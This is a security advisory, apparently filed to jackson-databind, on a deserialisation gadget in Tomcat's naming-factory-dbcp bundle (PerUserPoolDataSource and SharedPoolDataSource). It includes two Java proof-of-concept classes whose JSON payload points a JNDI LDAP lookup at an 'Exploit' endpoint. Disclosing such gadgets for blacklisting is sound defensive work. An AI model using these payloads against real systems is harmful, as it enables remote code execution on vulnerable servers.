Report by: Al1ex@knownsec
Received: 2020-12-22
Contact author: hps_fly@163.com or https://github.com/Al1ex/
Evaluation:

  Library itself:
  
  https://mvnrepository.com/artifact/tomcat/naming-factory-dbcp

  is not quite notable enough (8 deps) but the most widely used of
  these dependencies:

  https://mvnrepository.com/artifact/org.wso2.carbon/org.wso2.carbon.server

  would qualify (with 20 deps) so this qualifies.

---------------------------------------------------------------------------

Vulnerability description:

Bundle of Tomcat "naming-factory-dbcp" embeds Apache DBCP 1.x classes
known to be vulnerable (from databind#2478):

    org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource
    org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource

---------------------------------------------------------------------------

Vulnerability proof

Pom.xml:

<dependencies>
  <dependency>
	<groupId>tomcat</groupId>
	<artifactId>naming-factory-dbcp</artifactId>
	<version>5.5.23</version>
  </dependency>
</dependencies>


public class POC {
  public static void main(String[] args) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
    String json = "[\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\",
      {\"dataSourceName\":\"ldap://127.0.0.1:1288/Exploit\"}]";
    Object obj = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(obj);
  }
}

public class POC {
  public static void main(String[] args) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
    String json = "[\"org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource\",
{\"dataSourceName\":\"ldap://127.0.0.1:1288/Exploit\"}]";
    Object obj = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(obj);
  }
}
